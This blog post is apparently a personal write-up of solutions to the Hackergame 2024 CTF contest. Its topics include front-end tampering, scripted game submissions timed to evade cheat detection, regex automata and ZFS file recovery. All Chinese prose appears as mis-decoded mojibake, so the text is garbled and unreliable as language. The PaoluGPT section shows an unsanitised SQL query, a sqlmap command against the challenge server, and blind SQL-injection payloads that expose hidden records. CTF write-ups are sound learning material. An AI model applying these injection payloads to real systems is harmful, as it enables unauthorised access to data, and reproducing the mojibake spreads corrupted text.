---
author: Kris Hu
pubDatetime: 2024-11-10T15:24:29.000+08:00
modDatetime: 2024-11-10T21:43:00.000+08:00
title: Hackergame 2024 è§£é¢˜è®°å½•
featured: false
draft: false
tags:
  - Solution
  - Security
  - Linux
description: è®°å½•æˆ‘åœ¨ Hackergame 2024 ä¸­è§£é¢˜çš„è¿‡ç¨‹ä¸æ€è·¯
lang: zh-Hans
---

## Table of contents

## Introduction

Hackergame 2024 æ˜¯[ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬åä¸€å±Šä¿¡æ¯å®‰å…¨å¤§èµ›](https://hack.lug.ustc.edu.cn)ã€‚è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‚åŠ è¿™ç§ç±»ä¼¼ CTF çš„æ¯”èµ›ï¼Œä½†æ˜¯ç©çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒ ğŸ¥° æœ€åå¾—åˆ° 5950 åˆ†ï¼Œæ€»æ’å 25/2460ã€‚

è¿™æ¬¡æ¯”èµ›ä¹Ÿè®©æˆ‘å­¦ä¹ åˆ°å¾ˆå¤šçŸ¥è¯†ã€‚å¾ˆå¤šæŠ€æœ¯ä»¥å¾€åªæ˜¯æ¨¡ç³ŠçŸ¥é“æ¦‚å¿µï¼Œå®é™…å¹¶æ²¡æœ‰ä¸Šæ‰‹è¿‡ï¼Œäºæ˜¯å®é™…ä¸Šå°±æ˜¯ä¸çŸ¥é“ã€‚åœ¨ä¸€ä¸ªè¾ƒä¸ºæ‹ŸçœŸçš„ç¯å¢ƒä¸­å°†è¿™äº›ä¸œè¥¿å®é™…å®ç°å‡ºæ¥ï¼Œå¤§å¤§æœ‰åˆ©äºæŠ€æœ¯çš„ç²¾è¿›ï¼Œåˆæ˜¯å¤§é‡é¢˜ç›®å¯†é›†åœ¨ä¸€èµ·ï¼Œå®åœ¨ç›´å‘¼è¿‡ç˜¾ã€‚å½“ç„¶ï¼Œä¹Ÿç¡®å®æŒ‡å‡ºäº†æˆ‘ç°åœ¨çš„ä¸è¶³ä¹‹å¤„ ~~ï¼ˆå¦‚æœè¦æå…¨æ²¾å¼€å‘ï¼‰~~ ï¼šbinary é¢˜æˆ‘æ˜¯ä¸€ä¸ªä¸ä¼šå•Š ğŸ˜­

æœ¬æ¥æ˜¯æƒ³å°†æœ¬æ–‡å†™æˆé¢˜è§£çš„ã€‚ä½†æ˜¯æˆ‘èµ›åå»çœ‹äº†ä¸€ä¸‹å®˜æ–¹é¢˜è§£ï¼Œå…¶å®ä¸æˆ‘çš„æ–¹æ¡ˆéƒ½å·®åˆ«ä¸å°ï¼Œè€Œå®˜æ–¹é¢˜è§£æ˜¾ç„¶æ›´åŠ ä¼˜é›…è€Œå…·æœ‰å­¦ä¹ æ„ä¹‰ã€‚äºæ˜¯æ­¤æ–‡æƒå½“ä¸€ä¸ªå¯¹æˆ‘åšé¢˜è¿‡ç¨‹å’Œæ€è·¯çš„ç®€å•è®°å½•ç½¢ã€‚å› æ­¤ä»¥ä¸‹é¢˜ç›®æŒ‰æˆ‘èµ›æ—¶å¼€é¢˜é¡ºåºã€‚

## ç­¾åˆ°

æµè§ˆå™¨è°ƒå‡ºå¼€å‘è€…å·¥å…·å¯¹å‰ç«¯ä»£ç è¿›è¡Œå®¡è®¡ï¼Œæ³¨æ„åˆ° `function submitResult()` ä¸­æœ€å ``window.location = `?pass=${allCorrect}`;``

äºæ˜¯åœ°å€åé¢åŠ ä¸Š `?pass=true` å³å¯ã€‚

## å–œæ¬¢åšç­¾åˆ°çš„ CTFer ä½ ä»¬å¥½å‘€

é¦–å…ˆè°·é¸½æœç´¢ ã€Œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ æˆ˜é˜Ÿã€ï¼Œ å¾—çŸ¥ã€Œæ ¡å†… CTF æˆ˜é˜Ÿã€åº”æ˜¯æŒ‡ã€ŒNebulaã€ï¼Œç„¶åé€›äº†ä¸€ä¸‹æ‰¾åˆ°å®˜ç½‘æ˜¯ nebuu.la ã€‚~~ä¸è¿‡å…¶å®æ¯”èµ›ä¸»é¡µæœ‰~~

é€šè¿‡ `help` çœ‹äº†çœ¼æ‰€æœ‰å‘½ä»¤ï¼Œå†èŠ±äº†ä¸€åˆ†é’Ÿå…¨è¯•äº†ä¸€éï¼Œå‘ç°ä¸€ä¸ªåœ¨ `env`ï¼Œå¦å¤–ä¸€ä¸ªé€šè¿‡ `ls -la` å‘ç°åœ¨ `.flag` ã€‚

## çŒ«å’ªé—®ç­”ï¼ˆHackergame åå‘¨å¹´çºªå¿µç‰ˆï¼‰

æœç´¢å¼•æ“é¢˜ã€‚

1. åœ¨ https://lug.ustc.edu.cn/wiki/lug/events/hackergame/ å¯ä»¥çœ‹åˆ°å†æ¬¡æ¯”èµ›çš„å­˜æ¡£ã€‚æ¨ç®—å¾—çŸ¥ç¬¬äºŒå±Šå³ä¸º 2015 å¹´ã€‚
2. å¯¹ç€å®˜æ–¹å¾€å¹´é¢˜è§£ä¸€ä¸ªä¸ªæ•°ã€‚
3. ç¿»åˆ°å®˜æ–¹ 2018 å¹´çš„é¢˜è§£å‘ç°å½“å¹´ä¹Ÿæœ‰ã€ŒçŒ«å’ªé—®ç­”ã€ï¼Œå…¶ä¸­ç¬¬ 4 é¢˜è¦æ±‚åœ¨å›¾ä¹¦é¦†ä¸­æ£€ç´¢ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ï¼šé“¾æ¥ã€è£…è½½ä¸åº“ã€‹ã€‚äºæ˜¯åˆç†æ¨æµ‹ç­”æ¡ˆä¸º `ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»` ã€‚
4. å’•é¸½æœç´¢ ã€ŒUSENIX Security USTCã€ï¼Œæ²¡æœ‰å¾—åˆ°æ»¡æ„çš„ç»“æœã€‚æ›´æ¢å…³é”®è¯ä¸º ã€ŒUSENIX 2024 USTC "email"ã€ å¾—åˆ° https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf ã€‚
   ç›´æ¥ä¸€ä¸ª Cmd-F æœ ã€Œcombinationã€ å°±å¾—åˆ°äº† `, resulting in 336 combinations (including 16 web
interfaces of target providers).` (Ma et al., 2024)
5. ç´§è·Ÿæ—¶äº‹äº†ã€‚https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2
6. https://belladoreai.github.io/llama3-tokenizer-js/example-demo/build/
   ä½†æ˜¯å‘ç°ä¸å¯¹ï¼Œå°è¯• +1 æˆ–è€… -1 é‚è¿‡ã€‚

## æ‰“ä¸å¼€çš„ç›’

å’•æœæœç´¢ ã€Œwhat is a stl fileã€ å¾—çŸ¥åŸæ¥è¿™æ˜¯ä¸ª 3D æ¨¡å‹ï¼Œè€Œä¸” macOS è‡ªå¸¦çš„ Preview.app å¯ä»¥ç›´æ¥æ‰“å¼€ã€‚é‚ç›´æ¥å¼€ç›’æ‰‹æŠ„å‡º flagã€‚

## æ¯æ—¥è®ºæ–‡å¤ªå¤šäº†ï¼

ä¸‹è½½ PDF ç›´æ¥ Cmd-F æœç´¢ ã€Œflagã€ï¼Œå‘ç°åœ¨ Figure 6, p. 508 (Wang et al., 2024) å‘½ä¸­äº†ä¸€ä¸ª `flag here`ï¼Œä½†æ˜¯è¡¨é¢çœ‹ä¸åˆ°ä»»ä½•æ–‡å­—ã€‚

äºæ˜¯æŠŠ PDF ä¸¢è¿›äº† Pixelmator Pro ï¼ˆæˆ–è€…å…¶ä»–å¯ä»¥ç¼–è¾‘çŸ¢é‡å›¾çš„ï¼‰ä¸€çœ‹ï¼Œè¡¨é¢è¦†ç›–äº†ä¸€å±‚ç™½è‰²å¡«å……ï¼Œå¯ä»¥ç›´æ¥æ‹–åˆ°ä¸€è¾¹å»ï¼Œåº•ä¸‹çš„ flag å°±çœ‹å¾—åˆ°äº†ã€‚

## æ¯”å¤§å°ç‹

å‘ç°ä½ è¿™å°å­©å“¥æ˜¯ä¸ªä»£ç ï¼Œé‚£æˆ‘ä¹Ÿä¸Šä»£ç å§ã€‚

```python
game = session.post(
    "/game",
    cookies=cookies,
    headers=headers,
    json=json_data,
    verify=False,
)
game_data = json.loads(game.text)["values"]

results = []
for game in game_data:
    [a, b] = game
    results.append(">" if a > b else "<")
results_json = {"inputs": results}
```

æ³¨æ„éœ€è¦ä¸€ä¸ªæ¯”è¾ƒåˆé€‚çš„å»¶è¿Ÿå†ä¸Šä¼ ç­”æ¡ˆï¼Œä¸ç„¶ç³»ç»Ÿä¼šåˆ¤æ–­ä½œå¼Šã€‚

```python
import time

time.sleep(7)
submit = session.post(
    "/submit",
    cookies=cookies,
    headers=headers,
    json=results_json,
    verify=False,
)
print(json.loads(submit.text))
```

å³å¯å‡»è´¥ä½ è¿™è™šä¼ªçš„å°å­©å“¥ã€‚

## æ—…è¡Œç…§ç‰‡ 4.0

æœç´¢å¼•æ“é¢˜ã€‚

### ...LEO é…±ï¼Ÿâ€¦â€¦ ä»€ä¹ˆæ—¶å€™

1. ç™¾åº¦åœ°å›¾é¦–å…ˆæœç´¢ã€Œåˆè‚¥ã€è·³è½¬åˆ°åˆè‚¥å¸‚å†…ï¼Œç„¶åæœç´¢ã€Œç§‘é‡Œç§‘æ°”ç§‘åˆ›é©¿ç«™ ä¸­ç§‘å¤§ã€å³å¯ç›´æ¥ç¡®å®šã€‚
2. å¤æ­Œæœç´¢ã€Œä¸­ç§‘å¤§éŸ³ä¹ä¼šã€ï¼Œæ‰¾åˆ° https://space.bilibili.com/7021308/article ï¼Œåœ¨é‡Œé¢ç¿» 5 ç§’é’Ÿå°±çœ‹åˆ°äº†ã€‚

### è¯¶ï¼Ÿæˆ‘å¸¦ LEO é…±å‡ºå»ç©ï¼ŸçœŸçš„å‡çš„ï¼Ÿ

1. æ”¾å¤§å›¾ç‰‡å³ä¸‹è§’åƒåœ¾æ¡¶ç›¯å¸§ï¼Œå‘ç°å†™çš„ã€Œå…­å®‰ã€ã€‚åŒæ ·ç™¾æ¯’åœ°å›¾é¦–å…ˆæœç´¢ã€Œå…­å®‰ã€ï¼Œå†æœç´¢ã€Œå…¬å›­ã€ã€‚ç»™å‡ºäº†ä¸€ç³»åˆ—å…¬å›­ï¼Œæˆ‘çŒœæ˜¯æŒ‰çƒ­åº¦æ’åºçš„ï¼Ÿå…ˆçœ‹ç¬¬ä¸€ä¸ªâ€œä¸­å¤®æ£®æ—å…¬å›­â€ï¼Œæ‰“å¼€å«æ˜Ÿå›¾å¯ä»¥å‘ç°æ­¥é“ä¸­é—´æœ‰ç±»ä¼¼çš„çº¿ï¼ŒåŒæ ·è¢«åˆ’åˆ†æˆä¸‰æ¡é“ã€‚
2. ç›´æ¥å’•æ­Œæœå›¾å¯ä»¥æ‰¾åˆ°æºç¨‹ä¸Šçš„é¡µé¢ã€‚éƒ½ä¸ç”¨ç‚¹è¿›å»çœ‹ï¼Œâ€œå›å­å²­â€å°±å†™åœ¨æ ‡é¢˜ä¸Šã€‚

### å°¤å…¶æ˜¯ä½ æ‰æ˜¯æœ€è¯¥å¤šç»ƒä¹ çš„äºº

1. å…ˆåšç¬¬ 2 é—®ã€‚æ³¨æ„åˆ°æ­¤å¤„å­˜è½¦çº¿è§„æ¨¡å·¨å¤§ä¸”éƒ¨åˆ†çº¿ä¸Šç›–æœ‰å»ºç­‘ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªã€ŒåŠ¨è½¦æ‰€ã€ã€‚ç»§ç»­æœç´¢ã€Œæ€€å¯† åŠ¨è½¦æ‰€ã€ï¼Œå¯ä»¥ç¡®å®šæ€€å¯†çº¿ä½¿ç”¨çš„æ˜¯ã€ŒåŒ—äº¬åŒ—åŠ¨è½¦æ‰€ã€ã€‚åœ¨æ‘†æ¸¡åœ°å›¾æœç´¢ï¼Œå¯ä»¥ç¡®å®šé™„è¿‘çš„åŒ»é™¢ä¸º â€œç§¯æ°´æ½­åŒ»é™¢â€ã€‚ï¼ˆçœ‹èµ·æ¥è¿™å¼ ç…§ç‰‡å°±æ˜¯åœ¨åŒ»é™¢æ¥¼ä¸Šæ‹çš„ï¼Ÿ
2. å·¦ä¸‹è§’é‚£ç»„è½¦çš„ç²‰è‰²~~åœ¨åŒ—äº¬çš„é›¾éœ¾å¤©~~å¾ˆæ˜¯æ˜¾çœ¼å•Šï¼Œå¤å‰²æœç´¢ã€ŒCRH ç²‰è‰²ã€å¯ä»¥ç¡®å®šè¿™æ˜¯ã€Œå¸‚éƒŠé“è·¯æ€€å¯†çº¿ã€ã€‚è½¦è¾†å‹å·ä¸º â€œCRH6F-Aâ€ã€‚

## PaoluGPT

### åƒé‡ŒæŒ‘ä¸€

å†™äº†ä¸€ä¸ªçˆ¬è™«ã€‚

```python
response = requests.get(
    "/list",
    cookies=cookies,
    headers=headers,
)
tree = etree.HTML(response.text)
links = tree.xpath("//ul//a/@href")
for link in links:
    conv = requests.get(
        BASE_URL + link,
        cookies=cookies,
        headers=headers,
    )
    flags = re.findall(r"flag{.*?}", conv.text)
    if len(flags):
        print(flags, link)
```

### çª¥æ¢æœªçŸ¥

å‘ç°ç½‘ç«™æºç æ˜¯å¯ä»¥ä¸‹è½½çš„ï¼Œäºæ˜¯å¯¹å…¶è¿›è¡Œä¸€ä¸ªå®¡è®¡ã€‚å‘ç° L67, main.py SQLè¯­å¥æ²¡æœ‰åšä»»ä½•æ£€æŸ¥å°±æ ¼å¼åŒ–è¿›å»äº†ã€‚

```py
results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
```

ä¸è¿‡æˆ‘å·²ç»å¿˜è®°æ€ä¹ˆå†™æ³¨å…¥äº†ï¼Œé‚è®© sqlmap ä»£åŠ³ã€‚

```sh
nix run nixpkgs#sqlmap -- "/view?conversation_id=e94185f1-f26e-491c-bccf-92bd9f76b996" --cookie= --columns
```

ç»™å‡ºäº†ç›²æ³¨çš„ payloadã€‚

```sql
' AND 2724=2724 AND 'Magr'='Magr
```

è§‚å¯Ÿ `@app.route("/list")` çš„ä»£ç ï¼Œå…¶ä¸­è¦æ±‚

```sql
where shown = true
```

ç»“åˆæœ¬å°é¢˜åå­—ï¼Œæœ€åæˆ‘ä»¬è®¿é—® `/view?conversation_id=0' OR shown=false AND 2724=2724 AND 'Magr'='Magr` ã€‚åœ¨é¡µé¢ä¸Š Cmd-F ã€Œflagã€ å°±æ‰¾åˆ°äº†ã€‚

## å…ˆä¸è¯´å…³äºæˆ‘ä»é›¶ (åç•¥)

### ã€Œè¡Œå§å°±ç®—æ ‡é¢˜å¯ (åç•¥)

å½“æˆå¡«ç©ºé¢˜åšäº†ã€‚ä½†æ˜¯ä½ éƒ½æ‰“ä¸Š AI æ ‡ç­¾äº†ï¼Œé‚£ AI å…ˆå¡«ä¸€éã€‚æˆ‘å†æ”¹ä¸€éã€‚

### ã€Œå°±ç®—ä½ æŠŠæˆ‘è¯´çš„ (åç•¥)

ä¸ä¼šã€‚çœ‹å®˜æ–¹é¢˜è§£å‘ç°è‡ªå·±åº”è¯¥ä¼šçš„ã€‚ç¡®å®æ˜¯å¯¹ LLM ç†è§£ä¸å¤Ÿæ·±å…¥äº†ã€‚

## å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼

### Easy

[Wikipedia](https://zh.wikipedia.org/zh-cn/%E6%95%B4%E9%99%A4%E8%A7%84%E5%88%99) è¯´æ•´é™¤ 16 åªéœ€è¦æœ« 4 ä½è¢«æ•´é™¤å³å¯ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠ 0-9999 æ‰€æœ‰è¢«æ•´é™¤çš„åˆ—å‡ºæ¥ï¼Œå‰é¢å†å…è®¸ä»»æ„æ•°å­—å°±å¥½äº†ã€‚

```python
rex = []

for i in res:
    i = str(i)
    if len(i) == 1:
        rex.append(f"((000){i})")
    if len(i) == 2:
        rex.append(f"((00){i})")
    if len(i) == 3:
        rex.append(f"((0){i})")
    if len(i) == 4:
        rex.append(f"({i})")

rest = f"(|0|1|2|3|4|5|6|7|8|9)*({"|".join(rex)})"
print(rest)
```

### Medium

æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªçŠ¶æ€æœºï¼ˆæ¯•ç«Ÿæ­£åˆ™éƒ½å«æ­£åˆ™äº†ï¼‰ï¼Œè€ŒäºŒè¿›åˆ¶è¾“å…¥æ›´æ˜¯ä¸ºæ„é€ é™ä½äº†éš¾åº¦ã€‚

å…·ä½“æ¥è¯´ï¼Œ13 çš„ä½™æ•° 0-12 æ˜¯ 13 ä¸ªçŠ¶æ€ï¼Œè¾“å…¥åªæœ‰ 0 å’Œ 1ï¼Œåˆå§‹çŠ¶æ€ä¸º 0ï¼Œæ¥å—çš„æœ€ç»ˆçŠ¶æ€ä¸º 0ã€‚é‚£ä¹ˆè½¬ç§»å‡½æ•° $\delta: Q \times E \rightarrow Q$ å¯ä»¥å®šä¹‰ä¸º $\delta(s, i)=(2s+i)\bmod 13$ ã€‚

äºæ˜¯æˆ‘å°±å¼€å¿ƒåœ°å»æ‰‹åŠ¨æŠŠè¿™ä¸ªè‡ªåŠ¨æœºç”»å®Œäº†ï¼Œé—®é¢˜åªå‰©ä¸‹æ€ä¹ˆæŠŠçŠ¶æ€æœºå†™æˆæ­£åˆ™è¡¨è¾¾å¼ã€‚æ‰‹åŠ¨å»ç¿»è¯‘æ˜¯ä¸æ„¿æ„çš„ï¼Œè¿™ç©æ„çœ‹èµ·æ¥è¿˜æŒºé•¿çš„ã€‚äºæ˜¯æ‰¾åˆ°äº† [greenery](https://github.com/qntm/greenery) è¿™ä¸ªåº“ã€‚

```python
from greenery import Charclass, Fsm

fsm = greenery.Fsm(
    alphabet={Charclass("0"), Charclass("1"), ~Charclass("01")},
    states={0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, -1},
    initial=0,
    finals={0},
    map={
        0: {Charclass("0"): 0, Charclass("1"): 1, ~Charclass("01"): -1},
        1: {Charclass("0"): 2, Charclass("1"): 3, ~Charclass("01"): -1},
        2: {Charclass("0"): 4, Charclass("1"): 5, ~Charclass("01"): -1},
        3: {Charclass("0"): 6, Charclass("1"): 7, ~Charclass("01"): -1},
        4: {Charclass("0"): 8, Charclass("1"): 9, ~Charclass("01"): -1},
        5: {Charclass("0"): 10, Charclass("1"): 11, ~Charclass("01"): -1},
        6: {Charclass("0"): 12, Charclass("1"): 0, ~Charclass("01"): -1},
        7: {Charclass("0"): 1, Charclass("1"): 2, ~Charclass("01"): -1},
        8: {Charclass("0"): 3, Charclass("1"): 4, ~Charclass("01"): -1},
        9: {Charclass("0"): 5, Charclass("1"): 6, ~Charclass("01"): -1},
        10: {Charclass("0"): 7, Charclass("1"): 8, ~Charclass("01"): -1},
        11: {Charclass("0"): 9, Charclass("1"): 10, ~Charclass("01"): -1},
        12: {Charclass("0"): 11, Charclass("1"): 12, ~Charclass("01"): -1},
        -1: {Charclass("0"): -1, Charclass("1"): -1, ~Charclass("01"): -1},
    },
)
pattern = greenery.rxelems.from_fsm(fsm.reduce())
```

ä½†æ˜¯è¿™ä¸ªè¡¨è¾¾å¼æœ‰ä¸€äº›åœ°æ–¹ä¸ç¬¦åˆæˆ‘ä»¬é¢˜ç›®çš„è¦æ±‚ï¼Œå…·ä½“æ¥è¯´ï¼Œé‡Œé¢ç”¨äº† `?` å’Œ `{\d}` ã€‚æ‰€ä»¥æˆ‘æ‰‹åŠ¨å¯¹æ­£åˆ™è¡¨è¾¾å¼åšäº†ä¸€äº›æ­£åˆ™æ›¿æ¢ã€‚ç®€å•æ¥è¯´å°±æ˜¯æŠŠ `?` æ¢æˆ `(.*|)`ï¼Œå†æŠŠ `{\d}` å±•å¼€ã€‚

```python
pattern.equivalent(
    greenery.parse(
        ""
    )
)
```

æœ€åéªŒè¯è¡¨è¾¾å¼ç­‰ä»·ã€‚

### Hard

æ˜¾ç„¶ä¸ä¸Šä¸€é¢˜æ˜¯ç›¸åŒçš„å¥—è·¯ã€‚ä¸è¿‡æˆ‘æ²¡å†™å‡ºæ¥è½¬ç§»å‡½æ•°â€¦â€¦å› ä¸ºä¸ä¼š CRCã€‚

## æƒœå­—å¦‚é‡‘ 3.0

åˆæ˜¯ CRC ğŸ˜­

### é¢˜ç›® A

å¡«ç©ºé¢˜ã€‚AI ä¹Ÿä¼šå¡«ã€‚

## ZFS æ–‡ä»¶æ¢å¤

å“å‘€æœ€è¿‘æ­£å¥½åœ¨ç© ZFSã€‚æ¥è®©æˆ‘çœ‹çœ‹ï¼

é¦–å…ˆæ‹¿åˆ°ä¸€ä¸ª `.img`ï¼Œä¼ ç»Ÿç¾å¾·æ˜¯å…ˆä¸¢è¿›åå…­è¿›åˆ¶æŸ¥çœ‹å™¨çœ‹ä¸€çœ¼æœä¸€ä¸‹ï¼Œç»“æœç›´æ¥æŠŠ `flag2.sh` æ‹¿åˆ°æ‰‹äº†ã€‚è™½ç„¶ä¸æ˜¯ flagï¼Œé‚£å°±å…ˆå­˜ç€ã€‚

é‚£å°±æŒ‚è½½é•œåƒå§ï¼Œå…ˆç”¨çš„å‚è€ƒå‘½ä»¤ã€‚è¿›å»ä¸€çœ‹æœ‰ä¸ª snapshotï¼Œä½†æ˜¯æˆ‘ä»¬ç›´æ¥è·‘åˆ° `data/.zfs/snapshots` ä¸‹é¢ä¹Ÿæ˜¯æ²¡çœ‹ç€æ–‡ä»¶ã€‚

ç„¶åä¸€çœ‹ï¼Œ**ä»…ä¾›å‚è€ƒ**æ€ä¹ˆæ˜¯åŠ ç²—çš„ï¼ˆå…¶å®æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«æ„ä¹‰ï¼‰ï¼Œç„¶åçœ‹äº†ä¸€ä¸‹å¯ä»¥ `zpool-import` åˆ°ä¸€ä¸ªç‰¹å®š `txg` æ¥è¿›è¡Œå›æ»šã€‚ç„¶åæˆ‘æŠŠå…¨éƒ¨ txg éƒ½åˆ—å‡ºæ¥ï¼ˆ`zdb -u`ï¼Œè™½ç„¶æ²¡ä»€ä¹ˆç”¨ï¼‰ï¼Œç„¶åéƒ½å›æ»šäº†ä¸€éå‘ç°ä»€ä¹ˆä¹Ÿæ²¡å‘ç°ã€‚

å¥½å§ï¼Œé‚£åªèƒ½è®© `zdb` å¤šåµåµä¸€ä¸‹äº†ï¼Œ`zdb -ddddd hg2024` æ‹¿å‡ºæ¥äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ…¢æ…¢åˆ†æä¸€ä¸‹ã€‚æ–‡æ¡£æ˜¯è¯´ï¼Œ`Specified once, displays basic dataset information: ID, create transaction, size, and object count.` (zdb(8)) ã€‚è¿™æ˜¯æŠŠæ‰€æœ‰ object å’Œæœ‰å…³ block éƒ½åˆ—å‡ºæ¥äº†ã€‚

é‚£æˆ‘ä»¬æ¥æ‰¾æ‰¾æˆ‘ä»¬æƒ³è¦çš„ï¼šæ–‡ä»¶ã€‚åœ¨è¾“å‡ºé‡Œæœç´¢ `ZFS plain file`ï¼Œå¯ä»¥çœ‹åˆ°åªæœ‰ä¸¤ä¸ªã€‚é‚å¤§å–œï¼Œè¿™æ˜¾ç„¶å°±æ˜¯ `flag1.txt` å’Œ `flag2.sh`ã€‚æ³¨æ„ `flag2.sh` æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†ï¼Œæ˜¯ä¸ªæ¯”è¾ƒå°çš„æ–‡ä»¶ã€‚å¯ä»¥æ®æ­¤åŒºåˆ†ä¸¤ä¸ªæ–‡ä»¶ã€‚ï¼ˆè€Œä¸”åªæœ‰ä¸€ä¸ªæ–‡ä»¶ mode é‡Œæœ‰ x ï¼‰

```plain
    Object  lvl   iblk   dblk  dsize  dnsize  lsize   %full  type
         2    2   128K     4K  3.50K     512     8K  100.00  ZFS plain file
                                               176   bonus  System attributes
        dnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED
        dnode maxblkid: 1
        path    on delete queue
        uid     0
        gid     0
        atime   Thu Mar  9 23:56:50 2006
        mtime   Sun May 29 03:49:29 1977
        ctime   Wed Oct 23 21:37:22 2024
        crtime  Wed Oct 23 21:37:22 2024
        gen     10
        mode    100644
        size    4135
        parent  34
        links   0
        pflags  840800000004
Indirect blocks:
               0 L1  0:21800:400 20000L/400P F=2 B=11/11 cksum=00000090a02a87e8:00005c1242163a70:001f9a22c2a8565e:07b4c5ba8259446b
               0  L0 0:20e00:a00 1000L/a00P F=1 B=11/11 cksum=0000014a1deb79ea:0001a7601903257e:0162d0f05c3cdc80:ddef6cee5f27f0da
            1000  L0 EMBEDDED et=0 1000L/49P B=11

                segment [0000000000000000, 0000000000002000) size    8K

    Object  lvl   iblk   dblk  dsize  dnsize  lsize   %full  type
         3    1   128K    512    512     512    512  100.00  ZFS plain file
                                               176   bonus  System attributes
        dnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED
        dnode maxblkid: 0
        path    on delete queue
        uid     0
        gid     0
        atime   Mon Nov 10 04:49:03 2036
        mtime   Sat Jan 12 01:18:00 2013
        ctime   Wed Oct 23 21:37:22 2024
        crtime  Wed Oct 23 21:37:22 2024
        gen     11
        mode    100755
        size    331
        parent  34
        links   0
        pflags  840800000104
Indirect blocks:
               0 L0 0:20800:200 200L/200P F=1 B=11/11 cksum=000000183f4804d4:0000083252f9e1df:0001815a81b4ab7f:00329586c233bc76

                segment [0000000000000000, 0000000000000200) size   512
```

é‚£ä¹ˆè¿™æ—¶å€™ flag2 å·²ç»å¯ä»¥è§£äº†ã€‚çœ‹æ–‡æ¡£ stat(1)ï¼š

```
%X     time of last access, seconds since Epoch
%Y     time of last data modification, seconds since Epoch
```

é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åˆ†åˆ«æŠŠä¸¤ä¸ªæ–‡ä»¶çš„ `atime` å’Œ `mtime` è½¬æ¢æˆ UNIX timestampï¼Œæ›¿æ¢åˆ° `flag2.sh` è¿è¡Œå³å¯ã€‚

ç„¶åæˆ‘å¼€å§‹ç€æ‰‹æ¢å¤ `flag1.txt`ã€‚æˆ‘ä¸€å¼€å§‹æƒ³ï¼Œå•Šï¼Œæˆ‘éƒ½çŸ¥é“ä½ æ–‡ä»¶ object å¯¹åº”å“ªäº› block äº†ï¼Œç›´æ¥è¯»è¿™äº› block ï¼ˆ`zdb -R`ï¼‰ ä¸è¡Œå—ã€‚ä¸»è¦å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ã€‚å…¶ä¸€ï¼Œæ–‡ä»¶æ˜¯è¢« gzip å‹ç¼©çš„ï¼Œè€Œ zdb -R åœ¨ä¿¡æ¯ç†µä¸è¶³çš„æ—¶å€™æ— æ³•æ­£ç¡®è§£å‹ç¼©ã€‚å…¶äºŒï¼Œ`flag1.txt` æœ‰ä¸€éƒ¨ä»½å—åœ°å€ä¸º `EMBEDDED`ï¼Œç„¶åæˆ‘å½“æ—¶æ²¡æŸ¥åˆ°è¿™ä¸ªåœ°å€æŒ‡çš„å•¥ ğŸ¥²

ä¸è¿‡æ²¡å…³ç³»ï¼Œæˆ‘ä»¬ zdb ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥è¯» object çš„ã€‚`zdb -B` å¯ä»¥ç›´æ¥ dump ä¸€ä¸ª dataset å‡ºæ¥ï¼Œç„¶åå¯ä»¥è¢« `zstream dump -d` è§£æå‡ºæ¥ã€‚
ä¹Ÿå°±æ˜¯ `zdb -B hg2024/139 | zstream dump -d`

```
 6c 75 61 69  78 6d 70 72  70 67 68 61  71 6a 66 6c   luai xmpr pgha qjfl
    checksum = 2388d63a19/37aec6ae4719/393e10dd9e0ed3/2c106546000e7e31
WRITE object = 2 type = 19 checksum type = 2 compression type = 0 flags = 0 offset = 4096 logical_size = 4096 compressed_size = 0 payload_size = 4096 props = 0 salt = 0000000000000000 iv = 000000000000000000000000 mac = 00000000000000000000000000000000
 61 67 7b 70  31 41 49 6e  4e 4e 6d 6d  6e 6e 6d 6d   ag{p 1AIn NNmm nnmm
 6e 74 45 78  78 74 5f 35  30 65 61 73  79 7e 72 31   ntEx xt_5 0eas y~r1
 67 68 74 3f  7e 7d 0a 00  00 00 00 00  00 00 00 00   ght? ~}.. .... ....
```

æœç„¶æ˜¯è·¨å—äº†ï¼Œåï¼

## é›¶çŸ¥è¯†æ•°ç‹¬

### æ•°ç‹¬é«˜æ‰‹

ç½‘é¡µä¸Šç© 4 ä¸ªæ•°ç‹¬å°±è¡Œäº†ã€‚

å‰©ä¸‹çš„ä¸ä¼šã€‚

## æ— æ³•è·å¾—çš„ç§˜å¯†

çœ‹åˆ°è¿™é¢˜æˆ‘é¦–å…ˆæƒ³åˆ°çš„æ˜¯ QR Codeã€‚ä½†æ˜¯æˆ‘ä¸€çœ‹ï¼Œè¿™è¾“å…¥ç¡®å®æ˜¯åªæœ‰é”®ç›˜é¼ æ ‡å•Šï¼Œé‚£ QR Code çš„åº“è¦æ‰‹æ•²è¿›å» 15 åˆ†é’Ÿä¼°è®¡æ˜¯æ•²ä¸å®Œã€‚å…¶å®çœ‹èµ›åé¢˜è§£å‘ç°å¯ä»¥å†™è‡ªåŠ¨åŒ–ï¼Œä¸è¿‡æˆ‘ä»£ç éƒ½æ˜¯è¿œç¨‹æœåŠ¡å™¨å†™æ‰€ä»¥ç¬¬ä¸€æ—¶é—´æ²¡æƒ³åˆ°åœ¨æœ¬åœ°è·‘ä»£ç ã€‚

